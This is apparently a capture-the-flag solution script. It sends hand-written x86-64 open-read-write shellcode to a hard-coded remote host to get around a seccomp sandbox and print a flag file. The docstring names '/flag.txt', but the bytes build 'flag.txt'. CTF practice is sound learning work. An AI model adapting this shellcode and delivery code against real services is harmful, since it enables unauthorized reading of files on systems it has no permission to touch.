#!/usr/bin/env python3
"""
Basalt Chamber - CTF Solution

Uses ORW (Open-Read-Write) shellcode to read flag under seccomp sandbox.

The challenge implements a seccomp filter that blocks execve but allows
open/read/write syscalls. This script demonstrates bypassing the sandbox
using traditional ORW shellcode technique.
"""

from pwn import *

HOST = '34.62.69.250'
PORT = 41053

def build_shellcode():
    """Build ORW shellcode to read /flag.txt"""
    
    shellcode = bytes([
        # Stack setup - allocate 256 byte buffer
        0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,  # sub rsp, 0x100
        
        # Clear rax and set up memory
        0x48, 0x31, 0xc0,  # xor rax, rax
        0x48, 0x89, 0x04, 0x24,  # mov [rsp], rax
        
        # Build "/flag.txt" string on stack (byte by byte)
        0xc6, 0x44, 0x24, 0x00, 0x66,  # 'f'
        0xc6, 0x44, 0x24, 0x01, 0x6c,  # 'l'
        0xc6, 0x44, 0x24, 0x02, 0x61,  # 'a'
        0xc6, 0x44, 0x24, 0x03, 0x67,  # 'g'
        0xc6, 0x44, 0x24, 0x04, 0x2e,  # '.'
        0xc6, 0x44, 0x24, 0x05, 0x74,  # 't'
        0xc6, 0x44, 0x24, 0x06, 0x78,  # 'x'
        0xc6, 0x44, 0x24, 0x07, 0x74,  # 't'
        0xc6, 0x44, 0x24, 0x08, 0x00,  # \0
        
        # === OPEN ===
        0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00,  # mov rax, 2 (open syscall)
        0x48, 0x89, 0xe7,  # mov rdi, rsp (filename pointer)
        0x48, 0x31, 0xf6,  # xor rsi, rsi (O_RDONLY = 0)
        0x0f, 0x05,        # syscall
        0x89, 0xc3,        # mov ebx, eax (save file descriptor)
        
        # === READ ===
        0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00,  # mov rax, 0 (read syscall)
        0x89, 0xdf,        # mov edi, ebx (file descriptor)
        # lea rsi, [rsp + 0x100] (buffer)
        0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,
        0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # mov rdx, 256 (count)
        0x0f, 0x05,        # syscall
        
        # === WRITE ===
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # mov rax, 1 (write syscall)
        0xbf, 0x01, 0x00, 0x00, 0x00,  # mov edi, 1 (stdout)
        # lea rsi, [rsp + 0x100] (buffer)
        0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,
        0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # mov rdx, 256 (count)
        0x0f, 0x05,        # syscall
        
        0xf4,  # hlt (trap to exit cleanly)
    ])
    
    return shellcode


def exploit():
    """Main exploit function"""
    context.arch = 'amd64'
    context.timeout = 10
    
    print("[*] Basalt Chamber - ORW Shellcode Bypass")
    print(f"[*] Connecting to {HOST}:{PORT}")
    
    # Connect to remote service
    r = remote(HOST, PORT, timeout=5)
    
    # Receive initial prompt
    initial = r.recv(1024)
    print(f"[*] Received: {initial}")
    
    # Build and send shellcode
    shellcode = build_shellcode()
    print(f"[*] Sending ORW shellcode ({len(shellcode)} bytes)")
    r.send(shellcode)
    
    # Receive output
    sleep(0.5)
    try:
        output = r.recv(4096)
        print(f"[*] Output received ({len(output)} bytes)")
        
        # Extract flag from output
        output_str = output.decode('utf-8', errors='ignore')
        
        if '0xV01D{' in output_str:
            # Find the flag
            start = output_str.find('0xV01D{')
            end = output_str.find('}', start)
            if end != -1:
                flag = output_str[start:end+1]
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
            else:
                print("[*] Possible flag fragment:")
                print(output_str[output_str.find('0xV01D{'):])
        else:
            print("[*] No flag found in output")
            print(f"[*] Raw output: {repr(output)}")
            
    except Exception as e:
        print(f"[-] Error receiving output: {e}")
    
    r.close()
    return None


if __name__ == "__main__":
    flag = exploit()
    if flag:
        print(f"\n[SUCCESS] Flag: {flag}")
    else:
        print("\n[FAILURE] Could not retrieve flag")